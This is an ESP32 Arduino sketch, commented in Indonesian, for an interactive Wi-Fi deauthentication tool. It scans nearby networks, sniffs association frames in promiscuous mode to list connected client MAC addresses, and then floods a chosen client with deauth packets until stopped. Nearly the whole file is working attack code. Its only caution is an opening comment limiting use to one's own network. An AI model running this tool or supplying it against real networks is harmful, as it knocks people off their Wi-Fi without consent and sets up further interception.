/*
 *  Contoh Penggunaan Kelas WiFi_Utils Kustom dengan Seleksi Target Interaktif
 *  
 *  PERINGATAN: Gunakan hanya untuk edukasi dan pada jaringan yang Anda miliki.
 *  Penggunaan pada jaringan orang lain adalah ILEGAL.
 */

#include <Arduino.h>
#include <string>
#include <vector>
#include "wifi_utils.h" // Sertakan header kustom Anda

// Buat objek dari kelas WiFi_Utils
WiFi_Utils wifi_util(true);

// --- Variabel Global untuk State Machine ---
enum State {
  MENU,
  SCAN_RESULTS,
  SNIFFING_CLIENTS,
  CLIENT_RESULTS,
  ATTACKING
};
State currentState = MENU;

// Variabel untuk menyimpan target
bool isAttacking = false;
uint8_t target_ap_bssid[6];
uint8_t target_client_mac[6];
int target_channel = 1;

// Variabel untuk menyimpan hasil scan dan client
std::vector<std::string> found_clients;

// --- Fungsi Callback untuk Promiscuous Mode ---
// Fungsi ini akan dipanggil setiap kali sebuah paket Wi-Fi ditangkap
void promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return; // Hanya proses paket management

  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t *payload = pkt->payload;

  // Struktur header dari paket management (byte offset):
  // 0-1: Frame Control
  // 2-3: Duration
  // 4-9: Destination Address (DA)
  // 10-15: Source Address (SA)
  // 16-21: BSSID
  // ...

  // Kita hanya tertarik pada frame Association Request (subtype 0x00) atau Reassociation Request (subtype 0x20)
  // Ini adalah indikasi kuat bahwa sebuah klien sedang terhubung ke AP
  uint8_t frame_subtype = payload[0] & 0b00001111;
  if (frame_subtype == 0x00 || frame_subtype == 0x20) {
    // Bandingkan BSSID dari frame (byte 16-21) dengan BSSID target kita
    if (memcmp(&payload[16], target_ap_bssid, 6) == 0) {
      // Jika cocok, kita menemukan sebuah klien!
      // MAC klien ada di alamat sumber (Source Address - SA), byte 10-15
      char client_mac_str[18];
      sprintf(client_mac_str, "%02X:%02X:%02X:%02X:%02X:%02X",
              payload[10], payload[11], payload[12],
              payload[13], payload[14], payload[15]);
      
      std::string client_str(client_mac_str);

      // Tambahkan ke daftar jika belum ada (untuk menghindari duplikat)
      bool found = false;
      for (const auto& c : found_clients) {
        if (c == client_str) {
          found = true;
          break;
        }
      }
      if (!found) {
        found_clients.push_back(client_str);
        // --- PERBAIKAN 1: Pisahkan Serial.println untuk std::string ---
        Serial.print("[INFO] Client found: ");
        Serial.println(client_str.c_str());
      }
    }
  }
}

// --- Fungsi Bantuan ---

void printMenu() {
  Serial.println("\n--- Menu Deauther Kustom ---");
  Serial.println("1: Scan Jaringan Wi-Fi");
  Serial.println("-------------------------------");
  Serial.print("Masukkan perintah: ");
}

void printScanResults() {
  if (wifi_util.wifi_list.num == 0) {
    Serial.println("Tidak ada jaringan ditemukan.");
    currentState = MENU; // Kembali ke menu
    printMenu();
    return;
  }
  Serial.println("\n--- Pilih Jaringan Target ---");
  for (int i = 0; i < wifi_util.wifi_list.num; i++) {
    Serial.print((String)(i + 1) + ": ");
    Serial.print(wifi_util.wifi_list.ssid[i].c_str());
    Serial.print(" (");
    Serial.print(wifi_util.wifi_list.bssid[i].c_str());
    Serial.print(", CH: ");
    Serial.print(wifi_util.wifi_list.channel[i]);
    Serial.println(")");
  }
  Serial.println("0: Kembali ke Menu Utama");
  Serial.print("Masukkan nomor jaringan target: ");
}

void printClientList() {
  if (found_clients.empty()) {
    Serial.println("[INFO] Tidak ada klien yang ditemukan setelah 15 detik. Coba lagi.");
    currentState = MENU; // Kembali ke menu utama
    printMenu();
    return;
  }

  Serial.println("\n--- Pilih Klien Target ---");
  for (int i = 0; i < found_clients.size(); i++) {
    Serial.print((String)(i + 1) + ": ");
    Serial.println(found_clients[i].c_str());
  }
  Serial.println("0: Kembali ke Menu Utama");
  Serial.print("Masukkan nomor klien target: ");
}

// Fungsi parseMac sekarang menerima String Arduino
void parseMac(String macStr, uint8_t* mac) {
  for (int i = 0; i < 6; ++i) {
    mac[i] = strtol(macStr.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
  }
}

void setup() {
  Serial.begin(115200);
  delay(1000);
  pinMode(LED_BUILTIN, OUTPUT); // Inisialisasi LED

  // Inisialisasi sistem Wi-Fi
  wifi_util.init();

  Serial.println("Sistem siap. Gunakan Serial Monitor untuk mengontrol.");
  printMenu();
}

void loop() {
  // Logika serangan berjalan di background jika isAttacking true
  if (isAttacking) {
    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
    wifi_util.sendDeauthPacket(target_ap_bssid, target_client_mac);
    
    digitalWrite(LED_BUILTIN, HIGH);
    delay(1);
    digitalWrite(LED_BUILTIN, LOW);
  }

  // Proses input dari Serial Monitor
  if (Serial.available() > 0) {
    String input = Serial.readStringUntil('\n');
    input.trim();

    // Jika sedang menyerang, input apa saja akan menghentikan serangan
    if (isAttacking) {
      isAttacking = false;
      Serial.println("\n[INFO] Serangan dihentikan.");
      currentState = MENU;
      printMenu();
      return; // Proses input lainnya setelah serangan berhenti
    }

    // --- State Machine ---
    switch (currentState) {
      case MENU:
        if (input == "1") {
          wifi_util.scanWifiList();
          printScanResults();
          currentState = SCAN_RESULTS;
        } else {
          Serial.println("[ERROR] Perintah tidak valid.");
          printMenu();
        }
        break;

      case SCAN_RESULTS:
        {
          int choice = input.toInt();
          if (choice == 0) {
            currentState = MENU;
            printMenu();
          } else if (choice > 0 && choice <= wifi_util.wifi_list.num) {
            // Pilih AP target
            int index = choice - 1;
            // --- PERBAIKAN 2: Gunakan .c_str() untuk parseMac ---
            parseMac(wifi_util.wifi_list.bssid[index].c_str(), target_ap_bssid);
            target_channel = wifi_util.wifi_list.channel[index];
            
            // --- PERBAIKAN 3: Pisahkan Serial.println untuk std::string ---
            Serial.print("\n[INFO] Target AP dipilih: ");
            Serial.println(wifi_util.wifi_list.ssid[index].c_str());
            Serial.println("[INFO] Sedang mencari klien yang terhubung... (tunggu 15 detik)");

            // Siapkan untuk mencari client
            found_clients.clear();
            esp_wifi_set_promiscuous_rx_cb(&promiscuous_cb); // Set callback
            esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
            
            // Cari client selama 15 detik
            unsigned long startTime = millis();
            while (millis() - startTime < 15000) {
              delay(10); // Beri waktu untuk callback bekerja
            }
            
            esp_wifi_set_promiscuous_rx_cb(NULL); // Hentikan callback
            currentState = CLIENT_RESULTS;
            printClientList();

          } else {
            Serial.println("[ERROR] Nomor tidak valid. Coba lagi.");
            Serial.print("Masukkan nomor jaringan target: ");
          }
        }
        break;
      
      case CLIENT_RESULTS:
        {
          int choice = input.toInt();
          if (choice == 0) {
            currentState = MENU;
            printMenu();
          } else if (choice > 0 && choice <= found_clients.size()) {
            // Pilih klien target
            int index = choice - 1;
            // --- PERBAIKAN 4: Gunakan .c_str() untuk parseMac ---
            parseMac(found_clients[index].c_str(), target_client_mac);
            
            // --- PERBAIKAN 5: Pisahkan Serial.println untuk std::string ---
            Serial.print("\n[INFO] Target klien dipilih: ");
            Serial.println(found_clients[index].c_str());
            Serial.println("[INFO] Serangan akan dimulai. Ketik karakter apa saja untuk berhenti.");
            isAttacking = true; // Langsung mulai serangan
            currentState = ATTACKING;

          } else {
            Serial.println("[ERROR] Nomor tidak valid. Coba lagi.");
            Serial.print("Masukkan nomor klien target: ");
          }
        }
        break;
      
      case ATTACKING:
        // State ini tidak akan pernah tercapai karena input langsung menghentikan serangan
        break;

      default:
        currentState = MENU;
        break;
    }
  }
}